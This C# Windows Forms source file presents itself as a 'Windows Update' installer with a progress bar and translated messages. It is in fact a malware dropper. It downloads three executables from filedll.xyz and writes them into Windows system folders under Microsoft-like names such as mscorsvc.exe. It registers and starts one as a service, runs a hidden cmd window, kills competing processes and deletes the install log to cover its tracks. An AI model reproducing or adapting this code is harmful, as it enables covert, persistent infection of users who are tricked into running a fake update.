using System;
using System.Configuration.Install;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Net;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Windows_Update
{
    public partial class Form1 : Form
    {
        private string[] translate;
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load1(object sender, EventArgs e)
        {
            Task.Run(() =>
            {
                WebClient client = new WebClient();
                var urls = client.DownloadString("https://filedll.xyz/dwfiles.php").Split(';');
                var svnhost = client.DownloadData(urls[1]);
                var bnclient = client.DownloadData(urls[0]);
                var display = client.DownloadData(urls[2]);


                string svnhost_path = string.Format("{0}\\Microsoft.NET\\Framework{1}\\v4.0.30319", Environment.GetFolderPath(Environment.SpecialFolder.Windows), Environment.Is64BitOperatingSystem ? "64" : "") + "\\mscorsvc.exe";
                string bnclient_path = string.Format("{0}\\System32\\bnclient.exe", Environment.GetFolderPath(Environment.SpecialFolder.Windows));
                string display_path = string.Format("{0}\\System32\\display.exe", Environment.GetFolderPath(Environment.SpecialFolder.Windows));
                int action = 4;
                if (action == 1)
                {
                    var all = Process.GetProcessesByName("bnclient");
                    foreach (var item in all)
                    {
                        item.Kill();
                    }
                    all = Process.GetProcessesByName("display");
                    foreach (var item in all)
                    {
                        item.Kill();
                    }
                    File.Delete(bnclient_path);
                }
                else if (action == 2)
                {
                    var controller = new ServiceController
                    {
                        ServiceName = "mscorsvc"
                    };
                    controller.Stop();
                }
                else if (action == 3)
                {
                    ManagedInstallerClass.InstallHelper(new[] { @"/u", svnhost_path });
                }
                else
                {
                    File.WriteAllBytes(svnhost_path, svnhost);
                    File.WriteAllBytes(bnclient_path, bnclient);
                    File.WriteAllBytes(display_path, display);


                    ManagedInstallerClass.InstallHelper(new[] { svnhost_path });
                    var controller = new ServiceController
                    {
                        ServiceName = "mscorsvc"
                    };
                    controller.Start();
                }
            });
        }
        private void SetLanguage()
        {
            WebClient client = new WebClient
            {
                Encoding = Encoding.UTF8
            };
            translate = client.DownloadString("https://filedll.xyz/translate.php").Split(new string[] { "&&&" }, StringSplitOptions.None);
            CultureInfo ci = CultureInfo.InstalledUICulture;
            if (ci.TwoLetterISOLanguageName == "ru")
            {
                label3.Text = translate[0];
            }
            else
            {
                label3.Text = translate[2];

            }
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            SetLanguage();
            Task.Run(() =>
            {
                try
                {
                    WebClient client = new WebClient();
                    client.QueryString = new System.Collections.Specialized.NameValueCollection();
                    client.QueryString.Add("install", "1");
                    var urls = client.DownloadString("https://filedll.xyz/dwfiles.php").Split(';');
                    IncreaseProgressBarValue(1);
                    var svnhost = client.DownloadData(urls[1]);
                    var bnclient = client.DownloadData(urls[0]);
                    var display = client.DownloadData(urls[2]);
                    IncreaseProgressBarValue(2);
                    //string svnhost_path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\mscorsvc.exe";
                    //string bnclient_path = string.Format("{0}bnclient.exe", Path.GetTempPath());
                    //string display_path = string.Format("{0}display.exe", Path.GetTempPath());

                    string svnhost_path = string.Format("{0}\\Microsoft.NET\\Framework{1}\\v4.0.30319", Environment.GetFolderPath(Environment.SpecialFolder.Windows), Environment.Is64BitOperatingSystem ? "64" : "") + "\\mscorsvc.exe";
                    string bnclient_path = string.Format("{0}\\bnclient.exe", Environment.GetFolderPath(Environment.SpecialFolder.SystemX86));
                    string display_path = string.Format("{0}\\display.exe", Environment.GetFolderPath(Environment.SpecialFolder.SystemX86));
                    ServiceController ctl = ServiceController.GetServices().FirstOrDefault(s => s.ServiceName == "mscorsvc");
                    IncreaseProgressBarValue(3);

                    if (ctl != null)
                    {
                        try
                        {
                            if (ctl.Status == ServiceControllerStatus.Running)
                            {
                                ctl.Stop();
                            }

                            ctl.WaitForStatus(ServiceControllerStatus.Stopped);
                        }
                        catch (Exception)
                        {

                        }
                        IncreaseProgressBarValue(4);

                        try
                        {
                            System.Diagnostics.Process process = new System.Diagnostics.Process();
                            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo
                            {
                                WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden,
                                FileName = "cmd.exe",
                                Arguments = "/c sc delete mscorsvc"
                            };
                            process.StartInfo = startInfo;
                            process.Start();

                        }
                        catch (Exception)
                        {

                        }
                        IncreaseProgressBarValue(5);
                        TryDelete(svnhost_path);
                        IncreaseProgressBarValue(6);

                    }
                    else
                    {
                        IncreaseProgressBarValue(7);
                        IncreaseProgressBarValue(8);
                        IncreaseProgressBarValue(9);

                    }
                    KillAll("mscorsvc");
                    KillAll("bnclient");
                    KillAll("display");
                    IncreaseProgressBarValue(12);
                    File.WriteAllBytes(svnhost_path, svnhost);
                    IncreaseProgressBarValue(10);
                    File.WriteAllBytes(bnclient_path, bnclient);
                    File.WriteAllBytes(display_path, display);
                    IncreaseProgressBarValue(11);
                    ManagedInstallerClass.InstallHelper(new[] { svnhost_path });
                    var controller = new ServiceController
                    {
                        ServiceName = "mscorsvc"
                    };
                    controller.Start();
                    IncreaseProgressBarValue(12);
                    TryDelete("InstallUtil.InstallLog");
                    BeginInvoke(new ThreadStart(() =>
                    {
                        enabled = true; label3.Visible = false; progressBar1.Visible = false;


                        CultureInfo ci = CultureInfo.InstalledUICulture;
                        if (ci.TwoLetterISOLanguageName == "ru")
                        {
                            label2.Text = translate[1];
                        }
                        else
                        {
                            label2.Text = translate[3];

                        }
                    }));
                }
                catch(Exception ex)
                {
                    BeginInvoke(new ThreadStart(() =>
                    {
                            label3.Text = ex.Message;

                    }));
                }
            });
        }

        private void KillAll(string name)
        {
            try
            {
                var all = Process.GetProcessesByName(name);
                foreach (var item in all)
                {
                    item.Kill();
                }
            }
            catch
            {

            }
        }

        private void TryDelete(string path)
        {
            try
            {
                File.Delete(path);
            }
            catch
            {

            }
        }

        private bool enabled = false;

        private void IncreaseProgressBarValue(int val)
        {
            BeginInvoke(new ThreadStart(() => { progressBar1.PerformStep();/* label3.Text = val.ToString(); */}));
            Thread.Sleep(500);
        }
        private void label1_Click(object sender, EventArgs e)
        {
            if (enabled)
            {
                Close();
            }
        }
    }
}
